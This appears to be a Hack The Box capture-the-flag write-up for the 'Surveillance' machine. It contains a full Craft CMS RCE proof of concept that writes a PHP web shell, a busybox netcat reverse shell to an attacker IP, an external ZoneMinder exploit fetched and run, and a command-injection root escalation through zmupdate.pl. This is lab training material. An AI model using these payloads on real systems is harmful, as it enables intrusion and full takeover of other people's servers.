we start the machinhe with a classica nmap scan:
```bash
nmap -sC -sV -p- --min-rate=3600 10.10.11.245
```
output:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title:  Surveillance 
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
From the scan we can see that it's a typical linux machine with just a webserver and ssh.<br>

# Port 80

Since ssh is 99,9% of the time not bruteforcable or not vulnerable we can start by taking a look at webserver on port 80.<br>
if we visit the url on a browser we can see a redirect on the host `surveillance.htb` so i added to /etc/hosts file:
```bash
echo '10.10.11.245	surveillance.htb' >> /etc/hosts
```
Now we can visit the webserver and see this page:
	
![port 80](./pic/80.png)
	
The website is a presentation site for a surveillance-cam enterprise.<br>
The website is pretty static so i started enumerating it by running:
```bash
whatweb surveillance.htb
```
output:
```bash
http://surveillance.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
from the output of what web we can see that is a known CMS named `Craft CMS` running on a nginx reverse proxy.<br>
So the first thing i did is searching for known exploits on this cms.<br>

# www-data

Evnetually i found this [POC](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226) for an RCE, by looking a bit at the poc code we can see that it is using proxies to forward the requests; so i removed then resulting in this:
```python
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)    

def shell(cmd):
    response = requests.get(url + "/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if upload_tmp_dir == "no value" else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
```
Now we can run our poc like this:
```bash
python3 poc.py http://surveillance.htb
```
and get the call back as www-data!
	
![www-data](./pic/www-data.png)
	
We can now get a better shell moving on pwncat, to do so we can start the listener on our local machine by doing so:
```bash
pwncat-cs -lp 7777
```
and sending the call-back from the poc shell:
```bash
busybox nc 10.10.16.103 7777 -e /bin/bash &
```
we now have a pncat shell!:
	
![pwncat www-data](./pic/pc-www.png)
	

# matthew

Now we can take a look at some webserve's file.<br>
In fact in `/var/www/html/craft/storage/backups` we can see that there is an interesting file:
```bash
ls -la /var/www/html/craft/storage/backups
```
output:
```bash
total 28
drwxrwxr-x 2 www-data www-data  4096 Oct 17 20:33 .
drwxr-xr-x 6 www-data www-data  4096 Oct 11 20:12 ..
-rw-r--r-- 1 root     root     19918 Oct 17 20:33 surveillance--2023-10-17-202801--v4.4.14.sql.zip
```
it is a backup file that i downloaded with pwncat as follows:
```bash
Ctrl + d
downaload /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip /home/kali/htb/surveillance/surveillance.sql.zip
```
Now i can unzip it locally and see the content of it:
```bash
cd /home/kali/htb/surveillance/
unzip surveillance.sql.zip
strings surveillance.sql | grep -i 'users'
```
output:
```bash
[...]
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22dd[REDACTED]5c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
[...]
```
We can see that we have a sha256 hash of user matthew, that is also among the box users!.
we could try to crackit by running:
```bash
echo '39ed84b22dd[REDACTED]5c675770ec' > matthew.hash
jhon matthew.hash -w=/usr/share/wordlists/rockoyou.txt
```
Since i always try to go for the low-hanging fruits i searched the hash on crackstation, and got this:
	
![crackstation](./pic/crackstation.png)
	
Luckily for us we found the password with no effort (by obvious reason i redacted it).<br>
Now we can try to login with ssh on user matthew, i used once again pwncat:
```bash
pwncat-cs ssh://matthew:[REDACTED]@surveillance.htb
```

# zoneminder

We are in and we can start enumerating for stuff around.<br>
The only odd thing with this user is actually a webserver running locally on port 8080 for webcam administration, in fact if i curl it (on remote host) i can see this:
```bash
curl 127.0.0.1:8080
```
output:
```html
<div id="loginError" class="hidden alarm" role="alert">
                                <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>
                                Invalid username or password.
                        </div>

                        <div id="loginform">

        <h1><i class="material-icons md-36">account_circle</i> ZoneMinder Login</h1>

                                <label for="inputUsername" class="sr-only">Username</label>
                                <input type="text" id="inputUsername" name="username" class="form-control" autocapitalize="none" placeholder="Username" required autofocus autocomplete="username"/>

                                <label for="inputPassword" class="sr-only">Password</label>
                                <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required autocomplete="current-password"/>
                                <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>
                        </div>
```
From the html of the request we can see that is running `ZoneMinder`, a security-cam administration software.<br>
If we search for known exploits we can see:
```bash
searchsploit zoneminder
```
ouptut:
```bash
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ZoneMinder 1.24.3 - Remote File Inclusion                                                                                                                  | php/webapps/17593.txt
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery                                                | php/webapps/41239.txt
ZoneMinder 1.32.3 - Cross-Site Scripting                                                                                                                   | php/webapps/47060.txt
Zoneminder < v1.37.24 - Log Injection & Stored XSS & CSRF Bypass                                                                                           | php/webapps/51071.py
ZoneMinder Video Server - packageControl Command Execution (Metasploit)                                                                                    | unix/remote/24310.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
For the explouit to run we need to abuse the service running locally so i need to forward the ports locally on my machine; we have ssh creds so i used ssh -L:
```bash
ssh matthew@surveillance.htb -L 8085:127.0.0.1:8080
```
By doing so we forwarded the local port of the remote machine 8080 on our machine's port 8085.<br>
When we visit the site we got:
    
![zoneminder](./pic/ZoneMinder.png)
    
I searched online for some vulnerabilities and found this [POC here](https://github.com/rvizx/CVE-2023-26035).<br>
i tested it:
```bash
wget https://raw.githubusercontent.com/rvizx/CVE-2023-26035/main/exploit.py
pwncat-cs -lp 8888 #on another terminal
python3 exploit.py -t http://127.0.0.1:8085 -ip 10.10.14.107 -p 8888
```
We got a callback!
    
[zone minder user](./pic/zoneminder_callback.png)
    
now we need to escalate to root.<br>

# root

if we run:
```bash
sudo -l
```
output:
```bash
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```
i didn't understand what this thing was doing until i runned ls with that pattern:
```bash
ls -la /usr/bin/zm[a-zA-Z]*.pl
```
output:
```bash
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
```
Those are all the script that zoneminder software uses to administrate the system.<br>
they all are perl script, so in order to find some vulnerabilites i searched for perl strings that run commands.<br>
i asked Chat-GPT and it told me that i can use `system()` `` `<command_to_run>` `` or `qx()`.<br>
By running this grep command i searched for possible command injection, and eventually i found one.
```bash
grep -r 'qx(' /usr/bin/zm[a-zA-Z]*.pl -B 30
```
output:
```bash
/usr/bin/zmupdate.pl-  my $dbh = shift;
/usr/bin/zmupdate.pl-  my $version = shift;
/usr/bin/zmupdate.pl-
/usr/bin/zmupdate.pl-  my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ ) if $Config{ZM_DB_HOST};
/usr/bin/zmupdate.pl-  my $command = 'mysql';
/usr/bin/zmupdate.pl-  if ($super) {
/usr/bin/zmupdate.pl-    $command .= ' --defaults-file=/etc/mysql/debian.cnf';
/usr/bin/zmupdate.pl-  } elsif ($dbUser) {
/usr/bin/zmupdate.pl-    $command .= ' -u'.$dbUser;
/usr/bin/zmupdate.pl-    $command .= ' -p\''.$dbPass.'\'' if $dbPass;
/usr/bin/zmupdate.pl-  }
/usr/bin/zmupdate.pl-  if ( defined($portOrSocket) ) {
/usr/bin/zmupdate.pl-    if ( $portOrSocket =~ /^\// ) {
/usr/bin/zmupdate.pl-      $command .= ' -S'.$portOrSocket;
/usr/bin/zmupdate.pl-    } else {
/usr/bin/zmupdate.pl-      $command .= ' -h'.$host.' -P'.$portOrSocket;
/usr/bin/zmupdate.pl-    }
/usr/bin/zmupdate.pl-  } elsif ( $host ) {
/usr/bin/zmupdate.pl-    $command .= ' -h'.$host;
/usr/bin/zmupdate.pl-  }
/usr/bin/zmupdate.pl-  $command .= ' '.$Config{ZM_DB_NAME}.' < ';
/usr/bin/zmupdate.pl-  if ( $updateDir ) {
/usr/bin/zmupdate.pl-    $command .= $updateDir;
/usr/bin/zmupdate.pl-  } else {
/usr/bin/zmupdate.pl-    $command .= $Config{ZM_PATH_DATA}.'/db';
/usr/bin/zmupdate.pl-  }
/usr/bin/zmupdate.pl-  $command .= '/zm_update-'.$version.'.sql';
/usr/bin/zmupdate.pl-
/usr/bin/zmupdate.pl-  print("Executing '$command'\n") if logDebugging();
/usr/bin/zmupdate.pl-  ($command) = $command =~ /(.*)/; # detaint
/usr/bin/zmupdate.pl:  my $output = qx($command);
```
in fact in the file `/usr/bin/zmupdate.pl` there is a string append without input sanitization of the user paramether:
```bash
cat /usr/bin/zmupdate.pl
```
output:
```perl
[...]
if ( $response =~ /^[yY]$/ ) {
      my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
      my $command = 'mysqldump';
      if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser;  #here we have the code injection
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }
      if ( defined($portOrSocket) ) {
        if ( $portOrSocket =~ /^\// ) {
          $command .= ' -S'.$portOrSocket;
        } else {
          $command .= ' -h'.$host.' -P'.$portOrSocket;
        }
      } else {
        $command .= ' -h'.$host; 
      }
      my $backup = '/tmp/zm/'.$Config{ZM_DB_NAME}.'-'.$version.'.dump';
      $command .= ' --add-drop-table --databases '.$Config{ZM_DB_NAME}.' > '.$backup;
      print("Creating backup to $backup. This may take several minutes.\n");
      ($command) = $command =~ /(.*)/; # detaint
      print("Executing '$command'\n") if logDebugging();
      my $output = qx($command);
      my $status = $? >> 8;
      if ( $status || logDebugging() ) {
        chomp( $output );
        print( "Output: $output\n" );
      }
      if ( $status ) {
        die( "Command '$command' exited with status: $status\n" );
      } else {
        print( "Database successfully backed up to $backup, proceeding to upgrade.\n" );
      }
    } elsif ( $response !~ /^[nN]$/ ) {
      die( "Unexpected response '$response'" );
    }
  }
[...]
```
in order to get root we can just do the following:
```bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(cp /bin/bash /tmp/bash;chmod +s /tmp/bash)' --pass=ZoneMinderPassword2023
```
We created a bash copy on the /tmp/ folder with the suid bit set, and WE ARE ROOT!
    
![root proof](./pic/root_proof.png)
    




